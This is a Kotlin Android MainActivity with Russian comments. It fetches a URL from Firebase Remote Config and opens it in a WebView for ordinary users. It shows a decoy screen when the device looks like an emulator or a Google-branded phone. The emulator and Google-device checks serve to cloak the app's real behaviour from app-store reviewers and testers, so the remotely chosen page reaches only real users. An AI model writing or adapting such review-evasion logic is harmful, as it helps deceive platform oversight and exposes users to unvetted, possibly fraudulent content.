@file:Suppress("DEPRECATION")

package gofacts.sporhosee

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.net.NetworkInfo
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.util.Log
import android.widget.ProgressBar
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.remoteconfig.BuildConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings


@Suppress("DEPRECATION")
class MainActivity : AppCompatActivity() {

    private var flag1 = false
    private var flag2 = false
    private var flag3 = false
    private var flag4 = false
    private var shouldSpeedUp = false


    private lateinit var progressBar: ProgressBar
    private val handler = Handler()

    private lateinit var mFirebaseRemoteConfig: FirebaseRemoteConfig
    private lateinit var sharedPrefs: SharedPreferences

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        supportActionBar?.hide()


        progressBar = findViewById(R.id.progressBar)
        sharedPrefs = getSharedPreferences("MyAppPrefs", Context.MODE_PRIVATE)
        // Запуск инициализации, которая займет некоторое время
        initializeApp()

        mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance()
        val savedUrl = sharedPrefs.getString("savedUrl", "")


//        if (savedUrl.isNullOrEmpty()) {
//            Log.d("MainActivity", "тута")
//            val configSettings = FirebaseRemoteConfigSettings.Builder()
//                .setMinimumFetchIntervalInSeconds(1) // Установите интервал обновления на ноль
//                .build()
//            mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings)
//        }

        // Проверяем доступность сети
        if (isNetworkAvailable()) {

            if (savedUrl.isNullOrEmpty()) {

                try {
                    // Выполняем запрос на получение данных
                    mFirebaseRemoteConfig.fetchAndActivate().addOnCompleteListener(this) { task ->
                        if (task.isSuccessful) {

                            val url = mFirebaseRemoteConfig.getString("url")
                            Log.d("MainActivity", "Значение URL из Remote Config: $url")


                            if (url.isEmpty() || isEmulator() || isGoogleDevice()) {
                                openAnotherActivity()
                                flag3 = true
                                shouldSpeedUp = true
                                Log.d(
                                    "MainActivity",
                                    "прошла условие Значение URL из Remote Config: $url"
                                )
                            } else {
                                with(sharedPrefs.edit()) {
                                    putString("savedUrl", url)
                                    apply()
                                }
                                openWebViewActivity()
                                flag4 = true

                                Log.d("MainActivity", "зашел1")
                            }
                        } else {
                            Log.d("MainActivity", "зашел2")
                            handleFetchFailure()
                            shouldSpeedUp = true
                        }
                    }
                } catch (e: Exception) {
                    Log.d("MainActivity", "зашел3")
                    handleFetchFailure()
                    shouldSpeedUp = true
                }


            } else {
                Log.d("MainActivity", "savedUrl: $savedUrl")
                flag2 = true

            }
        } else {
            startActivity(Intent(this, NoInternetActivity::class.java))
            flag1 = true
            shouldSpeedUp = true
            // Интернет недоступен, переходим к экрану без интернета

        }
    }

    private fun initializeApp() {
        progressBar.progress = 0

        var flagThatTriggered = 0

        Thread {
            for (i in 1..100) {
                handler.post {
                    progressBar.progress = i
                }

                val delay =
                    if (shouldSpeedUp) 12L else 45L // Ускоряем после первого задействования флага

                Thread.sleep(delay)

                if (flag1) {
                    flagThatTriggered = 1
                }
                if (flag2) {
                    flagThatTriggered = 2
                }
                if (flag3) {
                    flagThatTriggered = 3
                }
                if (flag4) {
                    flagThatTriggered = 4
                }
            }
            when (flagThatTriggered) {
                1 -> {
                    Log.d("FlagTriggered", "Flag 1 сработал")
                    startActivity(Intent(this, NoInternetActivity::class.java))
                    finish()
                }

                2 -> {
                    Log.d("FlagTriggered", "Flag 2 сработал")
                    openWebViewActivity()
                }

                3 -> {
                    Log.d("FlagTriggered", "Flag 3 сработал")
                    openAnotherActivity()
                }

                4 -> {
                    Log.d("FlagTriggered", "Flag 4 сработал")
                    openWebViewActivity()
                }

            }
        }.start()
    }

    private fun openAnotherActivity() {
        val intent = Intent(this@MainActivity, AnotherActivity::class.java)
        startActivity(intent)
        Log.d("MainActivity", " открываем AnotherActivity")
    }

    private fun openWebViewActivity() {
        val intent = Intent(this@MainActivity, WV::class.java)
        startActivity(intent)
        Log.d("MainActivity", "Первый запуск приложения, открываем WebViewActivity")
    }


    private fun handleFetchFailure() {
        showToast("Failed to fetch data. Please check your network connection.")
        showErrorScreenWithMessage("Failed to fetch data. Please check your network connection.")
        Log.e("MainActivity", "Error while fetching data from Firebase Remote Config")
    }

    private fun showToast(message: String) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
    }

    private fun isNetworkAvailable(): Boolean {
        val connectivityManager =
            getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkInfo: NetworkInfo? = connectivityManager.activeNetworkInfo
        return networkInfo?.isConnectedOrConnecting == true
    }

    private fun showErrorScreenWithMessage(errorMessage: String) {
        val errorIntent = Intent(this, NoInternetActivity::class.java)
        errorIntent.putExtra("message", errorMessage)
        startActivity(errorIntent)
    }

    private fun isGoogleDevice(): Boolean {
        return Build.BRAND.equals("google", ignoreCase = true)
    }


    private fun isEmulator(): Boolean {
        if (BuildConfig.DEBUG) return false

        val phoneModel = Build.MODEL
        val buildProduct = Build.PRODUCT
        val buildHardware = Build.HARDWARE
        val brand = Build.BRAND

        return (Build.FINGERPRINT.startsWith("generic") || phoneModel.contains("google_sdk") || phoneModel.contains(
            "Emulator"
        ) || phoneModel.contains("Android SDK built for x86") || Build.MANUFACTURER.contains("Genymotion") || buildHardware == "goldfish" || brand.contains(
            "google"
        ) || buildHardware == "vbox86" || buildProduct == "sdk" || buildProduct == "google_sdk" || buildProduct == "sdk_x86" || buildProduct == "vbox86p" || Build.BOARD.contains(
            "nox"
        ) || Build.BOOTLOADER.contains("nox") || buildHardware.contains("nox") || buildProduct.contains(
            "nox"
        ))
    }


}
